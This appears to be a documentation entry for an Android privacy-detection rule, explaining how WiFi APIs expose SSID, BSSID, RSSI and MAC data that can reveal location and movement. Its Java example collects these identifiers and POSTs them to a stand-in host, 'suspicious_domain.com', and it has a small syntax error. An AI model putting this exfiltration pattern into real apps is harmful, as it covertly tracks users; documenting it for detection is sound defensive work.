Android APK WiFi API allows access to Personal Identifiable Information (PII) such as network names and access points usage history, potentially leading to private data inference.

Applications using the `ACCESS_WIFI_STATE` permission and calling APIs like `getConnectionInfo` can access sensitive information about WiFi access points (such as `BSSID`, `SSID`, and `RSSI`) and potentially infer:

* MAC Address which is a unique device identifier.
* Geolocation data by using surrounding WiFi access points.
* User movement history and social links inference relying on repeating patterns in WiFi access point usage.

### Examples

=== "Java"

 ```java
 
    import android.content.Context;
    import android.net.wifi.WifiInfo;
    import android.net.wifi.WifiManager;
    import java.net.HttpURLConnection;
    import java.net.URL;
    import java.io.OutputStream;
    import java.nio.charset.StandardCharsets;
    
    public class WifiInfoRetriever {
    
        private Context context;
    
        public WifiInfoRetriever(Context context) {
            this.context = context;
        }
    
        public void retrieveWifiInfo() {
            WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            
            if (wifiManager.isWifiEnabled()) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                
                String ssid = wifiInfo.getSSID();
                String bssid = wifiInfo.getBSSID();
                int rssi = wifiInfo.getRssi();
                String macAddress = wifiInfo.getMacAddress();
                
                // Construct JSON with data
                String jsonInputString = String.format("{\"ssid\":\"%s\", \"bssid\":\"%s\", \"rssi\":%d, \"macAddress\":\"%s\"}",
                ssid, bssid, rssi, macAddress);
                
                try {
                    // Endpoint URL
                    URL url = new URL("http://suspicious_domain.com/api/networks");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    
                    // Connection setup
                    connection.setDoOutput(true);
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json");
                    
                    try (OutputStream os = connection.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    // Additional analysis could be performed when the data reaches the endpoint
                    // such as inferring location or movement patterns of users             
                    connection.disconnect();
                } catch (Exception e) {
                    e.printStackTrace():
                }
            } else {
                System.out.println("WiFi is not enabled");
            }
        }
    }
 ```

